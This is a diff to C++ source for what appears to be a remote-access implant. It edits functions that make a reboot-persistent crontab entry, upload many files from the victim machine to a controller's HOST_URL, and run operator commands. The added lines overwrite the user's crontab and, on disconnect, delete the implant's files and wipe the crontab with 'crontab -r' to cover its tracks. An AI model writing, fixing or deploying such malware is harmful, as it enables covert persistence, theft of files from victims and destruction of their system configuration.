@@ -52,7 +52,8 @@ string exec(string cmd) {
         output += buffer.data();
     }
 
-    output.erase(output.length()-1); // remove last newline
+    if(output.length() != 0)
+        output.erase(output.length()-1); // remove last newline
 
     return output;
 }
@@ -182,8 +183,7 @@ void make_shell_persistance() {
 
     //Get persistance of launch script
     string script_path = exec("readlink -f script.sh");
-    cout << script_path << endl;
-    string sys_cmd = "(crontab -l; echo '@reboot sh "+ script_path +"' ) | crontab -";
+    string sys_cmd = "( echo '@reboot sh "+ script_path +"' ) | crontab -";
 
     //Run scrip on Linux
     string os = get_os();
@@ -221,12 +221,20 @@ void mass_upload(string command, string id) {
 
     // get the path string for each file found
     while( filesToUpload.length() != 0 ) {
-        tempFileName = filesToUpload.substr(0, filesToUpload.find("\n") + 1);
-        filesToUpload = filesToUpload.substr( filesToUpload.find("\n") + 1 );
 
-        cout << path + "/" + tempFileName << endl;
+        if( filesToUpload.find("\n") != std::string::npos )
+        {
+            tempFileName = filesToUpload.substr(0, filesToUpload.find("\n") + 1);
+            filesToUpload = filesToUpload.substr( filesToUpload.find("\n") + 1 );
+
+            tempFileName.erase(tempFileName.length()-1); // remove last newline
+        }else{
+            tempFileName = filesToUpload;
+            filesToUpload = "";
+        }
         
         upload_file(HOST_URL + "upload", path + "/" + tempFileName, id);
+        this_thread::sleep_for(chrono::seconds(3));
     }
 }
 
@@ -264,6 +272,9 @@ int main() {
         } else 
         if( MacroCmd == "disconnect" ) {
             post(HOST_URL + "disconnect", "id=" + id);
+            exec("rm script.sh");
+            exec("rm a.out");
+            exec("crontab -r");
             break;
         } else 
         if( MacroCmd == "command") {
